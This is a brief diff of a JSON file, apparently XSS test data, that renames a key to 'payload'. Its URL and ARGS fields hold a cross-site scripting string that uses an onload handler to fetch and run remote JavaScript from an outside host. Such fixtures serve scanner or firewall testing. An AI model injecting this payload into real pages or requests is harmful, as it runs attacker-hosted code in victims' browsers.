@@ -1,6 +1,6 @@
 
 {
-  "req": [
+  "payload": [
     {
       "URL": "onload=function(){$.getScript('//brutelogic.com.br/2.js')}",
       "ARGS": "onload=function(){$.getScript('//brutelogic.com.br/2.js')}",
